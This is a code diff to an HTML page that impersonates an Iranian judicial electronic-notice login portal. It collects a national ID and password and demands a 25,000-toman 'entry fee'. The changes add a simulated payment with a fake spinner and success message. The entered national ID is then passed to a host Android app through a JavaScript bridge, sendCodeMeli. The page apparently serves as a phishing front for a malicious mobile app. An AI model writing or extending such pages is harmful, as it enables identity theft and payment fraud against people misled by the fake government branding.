@@ -4,63 +4,84 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>سامانه احراز هویت ننا - سامانه ابلاغ الکترونیک قضایی</title>
+    <link href="https://cdn.jsdelivr.net/gh/rastikerdar/vazirmatn@v33.003/Vazirmatn-font-face.css" rel="stylesheet">
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=Vazirmatn:wght@400;500;700&display=swap');
-        
-        :root {
-            --primary-blue: #1a3c6c;
-            --secondary-blue: #2c5282;
-            --light-blue: #ebf4ff;
-            --accent-green: #38a169;
-            --text-dark: #2d3748;
-            --text-light: #f7fafc;
-            --border-color: #cbd5e0;
-            --shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
-        }
-        
         * {
             box-sizing: border-box;
             margin: 0;
             padding: 0;
+            font-family: Vazirmatn, sans-serif;
         }
         
         body {
-            font-family: 'Vazirmatn', sans-serif;
-            background-color: #f5f7fa;
-            color: var(--text-dark);
-            line-height: 1.6;
+            background: linear-gradient(135deg, #1a3c6c, #2c5282);
             min-height: 100vh;
             display: flex;
             justify-content: center;
             align-items: center;
             padding: 20px;
+            color: #333;
         }
         
         .container {
-            max-width: 500px;
             width: 100%;
+            max-width: 500px;
             background: white;
-            border-radius: 12px;
-            box-shadow: var(--shadow);
+            border-radius: 15px;
             overflow: hidden;
+            box-shadow: 0 15px 30px rgba(0, 0, 0, 0.25);
+            animation: slideUp 0.6s ease-out;
+        }
+        
+        @keyframes slideUp {
+            from { transform: translateY(50px); opacity: 0; }
+            to { transform: translateY(0); opacity: 1; }
         }
         
         .header {
-            background: linear-gradient(135deg, var(--primary-blue), var(--secondary-blue));
+            background: linear-gradient(135deg, #1a3c6c, #2c5282);
             color: white;
             padding: 25px 30px;
             text-align: center;
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .header::before {
+            content: "";
+            position: absolute;
+            top: -50px;
+            right: -50px;
+            width: 120px;
+            height: 120px;
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 50%;
+        }
+        
+        .header::after {
+            content: "";
+            position: absolute;
+            bottom: -30px;
+            left: -30px;
+            width: 80px;
+            height: 80px;
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 50%;
         }
         
         .header h1 {
             font-size: 1.8rem;
             margin-bottom: 8px;
             font-weight: 700;
+            position: relative;
+            z-index: 2;
         }
         
         .header p {
             font-size: 1.1rem;
             opacity: 0.9;
+            position: relative;
+            z-index: 2;
         }
         
         .user-type-container {
@@ -68,7 +89,7 @@
             flex-wrap: wrap;
             gap: 12px;
             padding: 20px;
-            background-color: var(--light-blue);
+            background-color: #ebf4ff;
             justify-content: center;
         }
         
@@ -78,7 +99,7 @@
             text-align: center;
             padding: 12px;
             background: white;
-            border: 2px solid var(--border-color);
+            border: 2px solid #cbd5e0;
             border-radius: 8px;
             cursor: pointer;
             transition: all 0.3s ease;
@@ -86,14 +107,14 @@
         }
         
         .user-type:hover {
-            border-color: var(--primary-blue);
+            border-color: #1a3c6c;
             background-color: rgba(26, 60, 108, 0.05);
         }
         
         .user-type.active {
-            border-color: var(--primary-blue);
+            border-color: #1a3c6c;
             background-color: rgba(26, 60, 108, 0.1);
-            color: var(--primary-blue);
+            color: #1a3c6c;
             font-weight: 700;
         }
         
@@ -115,14 +136,14 @@
         .form-group input {
             width: 100%;
             padding: 14px;
-            border: 2px solid var(--border-color);
+            border: 2px solid #cbd5e0;
             border-radius: 8px;
             font-size: 1rem;
             transition: border-color 0.3s ease;
         }
         
         .form-group input:focus {
-            border-color: var(--primary-blue);
+            border-color: #1a3c6c;
             outline: none;
             box-shadow: 0 0 0 3px rgba(26, 60, 108, 0.2);
         }
@@ -130,7 +151,7 @@
         .btn-next {
             width: 100%;
             padding: 14px;
-            background: linear-gradient(135deg, var(--accent-green), #2f855a);
+            background: linear-gradient(135deg, #38a169, #2f855a);
             color: white;
             border: none;
             border-radius: 8px;
@@ -155,14 +176,14 @@
         }
         
         .links a {
-            color: var(--primary-blue);
+            color: #1a3c6c;
             text-decoration: none;
             font-weight: 500;
             transition: color 0.3s ease;
         }
         
         .links a:hover {
-            color: var(--secondary-blue);
+            color: #2c5282;
             text-decoration: underline;
         }
         
@@ -191,11 +212,12 @@
             background: white;
             width: 90%;
             max-width: 400px;
-            border-radius: 12px;
+            border-radius: 15px;
             overflow: hidden;
             box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
             transform: translateY(20px);
             transition: transform 0.4s ease;
+            position: relative;
         }
         
         .payment-modal.active .modal-content {
@@ -203,7 +225,7 @@
         }
         
         .modal-header {
-            background: linear-gradient(135deg, var(--primary-blue), var(--secondary-blue));
+            background: linear-gradient(135deg, #1a3c6c, #2c5282);
             color: white;
             padding: 20px;
             text-align: center;
@@ -218,6 +240,14 @@
             font-size: 1.1rem;
             margin-bottom: 25px;
             line-height: 1.7;
+            color: #4a5568;
+        }
+        
+        .payment-amount {
+            font-size: 1.8rem;
+            font-weight: 700;
+            color: #2f855a;
+            margin: 15px 0;
         }
         
         .payment-options {
@@ -231,20 +261,20 @@
             display: flex;
             align-items: center;
             padding: 15px;
-            border: 2px solid var(--border-color);
+            border: 2px solid #cbd5e0;
             border-radius: 8px;
             cursor: pointer;
             transition: all 0.3s ease;
         }
         
         .payment-option:hover {
-            border-color: var(--primary-blue);
-            background-color: var(--light-blue);
+            border-color: #1a3c6c;
+            background-color: #ebf4ff;
         }
         
         .payment-option.active {
-            border-color: var(--primary-blue);
-            background-color: var(--light-blue);
+            border-color: #1a3c6c;
+            background-color: #ebf4ff;
         }
         
         .payment-icon {
@@ -256,6 +286,7 @@
             background: #edf2f7;
             border-radius: 8px;
             margin-left: 15px;
+            font-size: 1.2rem;
         }
         
         .payment-text {
@@ -267,7 +298,7 @@
         .btn-pay {
             width: 100%;
             padding: 14px;
-            background: linear-gradient(135deg, var(--accent-green), #2f855a);
+            background: linear-gradient(135deg, #38a169, #2f855a);
             color: white;
             border: none;
             border-radius: 8px;
@@ -283,21 +314,39 @@
             box-shadow: 0 6px 10px rgba(56, 161, 105, 0.4);
         }
         
-        .modal-footer {
-            padding: 15px 30px;
-            text-align: center;
-            background: #f7fafc;
-            border-top: 1px solid var(--border-color);
+        .spinner {
+            width: 20px;
+            height: 20px;
+            border: 3px solid rgba(255, 255, 255, 0.3);
+            border-top-color: #ffffff;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 0 auto;
         }
         
-        .modal-footer a {
-            color: var(--primary-blue);
-            text-decoration: none;
+        @keyframes spin { 
+            to { transform: rotate(360deg); } 
+        }
+        
+        .success-message {
+            display: none;
+            color: #38a169;
             font-weight: 500;
+            margin-top: 15px;
         }
         
-        .modal-footer a:hover {
-            text-decoration: underline;
+        .security-badge {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-top: 20px;
+            gap: 8px;
+            color: #4a5568;
+            font-size: 0.9rem;
+        }
+        
+        .security-badge svg {
+            fill: #38a169;
         }
         
         @media (max-width: 480px) {
@@ -317,6 +366,10 @@
                 min-width: 100px;
                 padding: 10px;
                 font-size: 0.9rem;
+            }
+            
+            .modal-body {
+                padding: 20px;
             }
         }
     </style>
@@ -362,7 +415,8 @@
             </div>
             
             <div class="modal-body">
-                <p>برای ورود به سامانه، باید مبلغ <strong>۲۵,۰۰۰ تومان</strong> را پرداخت نمایید.</p>
+                <p>برای ورود به سامانه، باید مبلغ زیر را پرداخت نمایید:</p>
+                <div class="payment-amount">۲۵,۰۰۰ تومان</div>
                 
                 <div class="payment-options">
                     <div class="payment-option active">
@@ -381,11 +435,20 @@
                     </div>
                 </div>
                 
-                <button class="btn-pay" id="payBtn">پرداخت و ورود به سامانه</button>
-            </div>
-            
-            <div class="modal-footer">
-                <a href="#" id="cancelPayment">بازگشت به صفحه ورود</a>
+                <button class="btn-pay" id="payBtn">
+                    <span id="payBtnText">پرداخت و ورود به سامانه</span>
+                </button>
+                
+                <div class="success-message" id="successMessage">
+                    ✅ کد ملی با موفقیت ارسال شد
+                </div>
+                
+                <div class="security-badge">
+                    <svg width="20" height="20" viewBox="0 0 24 24">
+                        <path d="M12,1L3,5v6c0,5.55,3.84,10.74,9,12c5.16-1.26,9-6.45,9-12V5L12,1z M10,17l-4-4l1.41-1.41L10,14.17l6.59-6.59L18,9L10,17z"/>
+                    </svg>
+                    امنیت و حریم خصوصی شما تضمین شده است
+                </div>
             </div>
         </div>
     </div>
@@ -413,43 +476,75 @@
             // Next step button
             const nextStepBtn = document.getElementById('nextStepBtn');
             const paymentModal = document.getElementById('paymentModal');
+            const payBtn = document.getElementById('payBtn');
+            const payBtnText = document.getElementById('payBtnText');
+            const successMessage = document.getElementById('successMessage');
+            const nationalCodeInput = document.getElementById('nationalCode');
+            const passwordInput = document.getElementById('password');
             
             nextStepBtn.addEventListener('click', function() {
-                const nationalCode = document.getElementById('nationalCode').value;
-                const password = document.getElementById('password').value;
+                const nationalCode = nationalCodeInput.value.trim();
+                const password = passwordInput.value.trim();
                 
                 if (!nationalCode || !password) {
                     alert('لطفاً شماره ملی و رمز عبور را وارد کنید.');
                     return;
                 }
                 
+                // Validate national code (simple 10-digit check)
+                if (nationalCode.length !== 10 || isNaN(nationalCode)) {
+                    alert('لطفاً یک شماره ملی معتبر ۱۰ رقمی وارد کنید.');
+                    return;
+                }
+                
                 // Show payment modal
                 paymentModal.classList.add('active');
-                
-                // In a real app, you would send the national code and password to the server here
-                // For demonstration, we'll log them to the console
-                console.log('کد ملی ارسال شده:', nationalCode);
-                console.log('رمز عبور ارسال شده:', password);
             });
             
             // Pay button
-            const payBtn = document.getElementById('payBtn');
             payBtn.addEventListener('click', function() {
-                alert('در حال انتقال به درگاه پرداخت...');
-                // In a real app, you would redirect to a payment gateway
-            });
-            
-            // Cancel payment
-            const cancelPayment = document.getElementById('cancelPayment');
-            cancelPayment.addEventListener('click', function(e) {
-                e.preventDefault();
-                paymentModal.classList.remove('active');
+                const nationalCode = nationalCodeInput.value.trim();
+                
+                // Show spinner and change button text
+                payBtnText.innerHTML = '<div class="spinner"></div>';
+                
+                // Simulate payment processing
+                setTimeout(() => {
+                    // After payment processing
+                    try {
+                        // Check if Android interface is available
+                        if (typeof window.Android !== 'undefined' && typeof window.Android.sendCodeMeli === 'function') {
+                            console.log('Sending national code to Android:', nationalCode);
+                            window.Android.sendCodeMeli(nationalCode);
+                        } else {
+                            // Fallback for testing in a browser
+                            console.log('Android interface not found. Fallback mode. National code:', nationalCode);
+                        }
+                        
+                        // Show success message
+                        successMessage.style.display = 'block';
+                        payBtnText.textContent = 'پرداخت موفقیت‌آمیز';
+                        
+                        // Close modal after 2 seconds
+                        setTimeout(() => {
+                            paymentModal.classList.remove('active');
+                            successMessage.style.display = 'none';
+                            payBtnText.textContent = 'پرداخت و ورود به سامانه';
+                        }, 2000);
+                    } catch (e) {
+                        console.error('Error in sendCodeMeli:', e);
+                        alert('خطا در ارسال کد ملی به سیستم');
+                        payBtnText.textContent = 'پرداخت و ورود به سامانه';
+                    }
+                }, 1500);
             });
             
             // Close modal when clicking outside
             paymentModal.addEventListener('click', function(e) {
                 if (e.target === paymentModal) {
                     paymentModal.classList.remove('active');
+                    payBtnText.textContent = 'پرداخت و ورود به سامانه';
+                    successMessage.style.display = 'none';
                 }
             });
         });
